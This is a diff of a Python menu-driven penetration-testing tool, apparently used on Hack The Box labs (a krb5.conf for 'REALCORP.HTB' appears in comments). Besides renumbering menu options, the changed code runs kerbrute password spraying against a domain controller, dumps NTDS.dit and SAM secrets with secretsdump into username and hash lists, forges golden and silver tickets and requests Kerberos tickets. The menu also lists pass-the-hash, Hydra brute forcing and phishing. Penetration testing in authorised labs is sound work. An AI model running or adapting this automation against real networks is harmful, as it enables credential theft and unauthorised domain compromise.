@@ -64,21 +64,21 @@ def test_Domain():
    else:
       return 0  
    
-def testUsername():
+def test_Username():
    if USR == "":
       print("[-] USERNAME has not been specified...")
       return 1
    else:
       return 0
       
-def testPassword():
+def test_Password():
    if PAS == "":
       print("[-] PASSWORD has not been specified...")
       return 1
    else:
       return 0
       
-def testSID():
+def test_SID():
    if SID[:5] == "EMPTY":
       print("[-] Domain SID has not been specified...")
       return 1
@@ -615,14 +615,14 @@ def options():
    print("(79) Hydra  SSH (90) SSH      " + '\u2551')
      
    print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69)             (80) Hydra SMTP (91) SSHKeyID " + '\u2551')   
-   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start  Responder (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70)             (81) Hydra HTTP (92) Telnet   " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER   NAME (16) who  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenSSHkeyID (82) Hydra  SMB (93) Netcat   " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig  DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra POP3 (94) SQSH     " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Enum DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) SmbExecHASH (73) GenListPass (84) Hydra  RDP (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Reco DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) WmiExecHASH (74) GenPhishCod (85) Hydra  TOM (96) MySQL    " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap LIVE  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) MSFCon TOM (97) WinRm    " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) DIR Searchs (87) MSFCon OWA (98) RemDesk  " + '\u2551')
-   print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33) NFSMount (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) MSFCon RCE (99) Exit     " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start  Responder (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) GenSSHKeyID (81) Hydra HTTP (92) Telnet   " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER   NAME (16) who  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenListUser (82) Hydra  SMB (93) Netcat   " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig  DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListPass (83) Hydra POP3 (94) SQSH     " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Enum DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) SmbExecHASH (73) GenPhishCod (84) Hydra  RDP (95) MSSQL    " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Reco DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) WmiExecHASH (74) AutoPhisher (85) Hydra  TOM (96) MySQL    " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap LIVE  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) DIR Searchs (86) MSFCon TOM (97) WinRm    " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Nikto Scans (87) MSFCon OWA (98) RemDesk  " + '\u2551')
+   print('\u2551' + "(11) Re/Set SHARE  NAME (22) Nmap Sub DOMAINS (33) NFSMount (44) SmbMount SHARE (55) Golden DC PAC (66) KBR5 Ticket (77) NTDSDECRYPT (88) MSFCon RCE (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -1572,7 +1572,7 @@ while True:
             remCommand("nmap " + IP46 + " -p " + PTS + " -sT -sU -sV -O -A -T4 --reason --script=banner " + TIP.rstrip(" "))
          else:
             print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3))
-            remCommand("nmap " + IP46 + " -p- -sT -sU -sV -O -A -T4 --reason --script=banner " + TIP.rstrip(" "))
+            remCommand("nmap " + IP46 + " -sT -Pn " + TIP.rstrip(" "))
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2349,7 +2349,7 @@ while True:
 
       if checkParams != 1:
          print(colored("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...", colour3))
-         remCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.tmp")
+         remCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password '" + PAS.rstrip(" ") + "' -outputfile password1.tmp")
          test1 = linecache.getline("password1.tmp", 1)         
       
          if test1 != "":
@@ -2360,8 +2360,8 @@ while True:
             TGT = privCheck(TGT)   
                       
          if found == 0:
-            print("\n[*] Now trying all usernames with matching passwords...")
-            remCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")         
+            print(colored("\n[*] Now trying all usernames with matching passwords...",colour3))
+            remCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")
             test2 = linecache.getline("password2.tmp", 1)  
                       
             if test2 != "":
@@ -2372,7 +2372,7 @@ while True:
                TGT = privCheck(TGT)             
                  
          if found == 0:
-            print("\n[*] Now trying all users against password list, please wait as this could take sometime...")            
+            print(colored("\n[*] Now trying all users against password list, please wait as this could take sometime...",colour3))            
             remCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
             test3 = linecache.getline("password3.tmp", 1) 
                       
@@ -2463,7 +2463,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '50':
-      checkParams = testPassword()
+      checkParams = test_Password()
       if checkParams != 1:    
          NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
          NTM = binascii.hexlify(NTM)
@@ -2592,7 +2592,7 @@ while True:
          checkParams = test_Domain()            
          
       if checkParams != 1:
-         checkParams = testUsername()
+         checkParams = test_Username()
          
       if checkParams != 1:
          print(colored("[*] Trying to create silver TGT for user " + USR.rstrip(" ") + "...", colour3))         
@@ -2624,7 +2624,7 @@ while True:
          checkParams = test_Domain()      
          
       if checkParams != 1:
-         checkParams = testUsername         
+         checkParams = test_Username         
          
       if checkParams != 1:
          print(colored("[*] Trying to create golden TGT for user " + USR.rstrip(" ") + "...", colour3))         
@@ -2975,66 +2975,29 @@ while True:
       if checkParams != 1:
          remCommand("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")   
       prompt()
-      
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - NTDS CRACKER (EXPERIMENTAL)
+# Details : Menu option selected - kinit j.nakazawa@REALCORP.HTB.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='66':           
-      print(colored("[*] Checking " + workDir + " for relevant files...", colour3))  
-          
-      if os.path.exists("./" + workDir + "/ntds.dit"):
-         print("[+] File ntds.dit found...")
-      else:
-         print("[-] File ntds.dit not found, checking for SAM...")
-         
-         if os.path.exists("./" + workDir + "/SAM"):
-            print("[+] File SAM found...")
-         else:
-            print("[-] File SAM not found...")
-            checkParams =1         
-            
-      if os.path.exists("./" + workDir + "/SYSTEM"):
-         print("[+] File SYSTEM found...")
-      else:
-         print("[-] File SYSTEM not found...")
-         checkParams = 1         
-         
-      if os.path.exists("./" + workDir + "/SECURITY"):
-         print("[+] File SECURITY found...")
-      else:
-         print("[-] File SECURITY not found")
-         checkParams = 1         
-         
+   if selection =='66':
+      checkParams = test_IP()
+
       if checkParams != 1:
-         print(colored("[*] Extracting stored secrets, please wait...", colour3))
-         
-         if os.path.exists("./" + workDir + "/SAM"):
-            remCommand(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
-            localCommand("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
-            localCommand("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
-         else:
-            remCommand(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
-            localCommand("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
-            localCommand("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")        
-            
-         print("[+] Importing extracted secrets...")         
-         with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
-           for x in range (0, maxUser):
-               USER[x] = read1.readline().rstrip("\n")
-               USER[x] = spacePadding(USER[x], COL3)                  
-               HASH[x] = read2.readline().rstrip("\n")
-               
-               if USER[x] != "":
-                  HASH[x] = spacePadding(HASH[x], COL4)
-               else:
-                  HASH[x] = dotPadding(HASH[x], COL4)
-               VALD[x] = "0"               
-         wipeTokens(VALD)        
+         checkParams = test_Domain()
+
+      if checkParams != 1:
+         checkParams = test_Username()
+
+      if checkParams != 1:
+         print(colored("[*] Trying to create ticket for user " + USR.rstrip(" ") + "...\n", colour3))
+         localCommand("kinit " + USR.rstrip(" ") + "@" + DOM.rstrip(" "))
+         localCommand("klist")
+
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3046,8 +3009,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='67':
-      checkParam = 0
-      print("[!] (1) USER NAMES (2) PASS WORDS (3) NTLM HASHES (4) HOSTS CONFIG (5) RESOLV CONFIG (6) PROXYCHAINS CONFIG")
+      print("[!] (1) USER NAMES (2) PASS WORDS (3) NTLM HASHES (4) HOSTS CONFIG (5) RESOLV CONFIG (6) PROXYCHAINS CONFIG (7) KERB5 CONFIG")
+      
+      checkParams = 0
       subChoice = input("[?] Please select the file you wish to edit: ")
       
       if subChoice == "1":
@@ -3061,7 +3025,7 @@ while True:
          
       if subChoice == "2":
          localCommand("nano " + dataDir + "/passwords.txt")
-         checkParam = 1
+         checkParams = 1
          
       if subChoice == "3":
          localCommand("nano " + dataDir + "/hashes.txt")                 
@@ -3070,21 +3034,32 @@ while True:
                HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
                HASH[x] = spacePadding(HASH[x], COL4)            
          wipeTokens(VALD)
-         checkParam = 1
+         checkParams = 1
          
       if subChoice == "4":
          localCommand("nano /etc/hosts")
-         checkParam = 1
+         checkParams = 1
          
       if subChoice == "5":
          localCommand("nano /etc/resolv.conf")
-         checkParam = 1
+         checkParams = 1
          
       if subChoice == "6":
          localCommand("nano /etc/proxychains.conf")
-         checkParam = 1
+         checkParams = 1
          
-      if checkParam == 0:
+      if subChoice == "7":
+         localCommand("nano /etc/krb5.conf")
+         checkParams = 1
+         
+#[libdefaults]
+#	default_realm = REALCORP.HTB
+#[realms]
+#	REALCORP.HTB = {
+#	kdc = 10.10.10.224
+#	}
+
+      if checkParams == 0:
          print("[-] Sorry, I do not understand the value " + subChoice + "...")    
       prompt()
       
@@ -3120,22 +3095,11 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='70':
-      exit(1)
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
 # Details : Menu option selected - SSH GEN GENERATION
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='71':
+   if selection =='70':
       print(colored("[*] Generating Keys...\n", colour3))
       localCommand("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
       localCommand("tput setaf 2; tput bold")
@@ -3157,7 +3121,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='72':
+   if selection =='71':
       checkParams = test_IP()    
         
       if checkParams != 1:
@@ -3182,7 +3146,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='73':
+   if selection =='72':
       checkParams = test_IP()           
       
       if checkParams != 1:
@@ -3203,7 +3167,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='74':
+   if selection =='73':
       checkParams = getPort()      
       
       if HTTP == 0:
@@ -3239,7 +3203,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='75':
+   if selection =='74':
       checkParams = test_IP()
       
       if checkParams != 1:
@@ -3327,7 +3291,7 @@ while True:
 # Note    : Alternative dictionary - /usr/share/dirb/wordlists/common.txt
 # -------------------------------------------------------------------------------------
 
-   if selection =='76':
+   if selection =='75':
       checkParams = test_IP()                 
       
       if checkParams != 1:
@@ -3348,7 +3312,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='77':
+   if selection =='76':
       if IP46 == "-4":
          checkParams = test_IP()
       else:
@@ -3365,6 +3329,67 @@ while True:
             else:
                remCommand("nikto -h " + TIP.rstrip(" "))              
       prompt()  
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - NTDS CRACKER (EXPERIMENTAL)
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='77':           
+      print(colored("[*] Checking " + workDir + " for relevant files...", colour3))  
+          
+      if os.path.exists("./" + workDir + "/ntds.dit"):
+         print("[+] File ntds.dit found...")
+      else:
+         print("[-] File ntds.dit not found, checking for SAM...")
+         
+         if os.path.exists("./" + workDir + "/SAM"):
+            print("[+] File SAM found...")
+         else:
+            print("[-] File SAM not found...")
+            checkParams =1         
+            
+      if os.path.exists("./" + workDir + "/SYSTEM"):
+         print("[+] File SYSTEM found...")
+      else:
+         print("[-] File SYSTEM not found...")
+         checkParams = 1         
+         
+      if os.path.exists("./" + workDir + "/SECURITY"):
+         print("[+] File SECURITY found...")
+      else:
+         print("[-] File SECURITY not found")
+         checkParams = 1         
+         
+      if checkParams != 1:
+         print(colored("[*] Extracting stored secrets, please wait...", colour3))
+         
+         if os.path.exists("./" + workDir + "/SAM"):
+            remCommand(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
+            localCommand("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
+            localCommand("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
+         else:
+            remCommand(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
+            localCommand("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
+            localCommand("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")        
+            
+         print("[+] Importing extracted secrets...")         
+         with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
+           for x in range (0, maxUser):
+               USER[x] = read1.readline().rstrip("\n")
+               USER[x] = spacePadding(USER[x], COL3)                  
+               HASH[x] = read2.readline().rstrip("\n")
+               
+               if USER[x] != "":
+                  HASH[x] = spacePadding(HASH[x], COL4)
+               else:
+                  HASH[x] = dotPadding(HASH[x], COL4)
+               VALD[x] = "0"               
+         wipeTokens(VALD)        
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
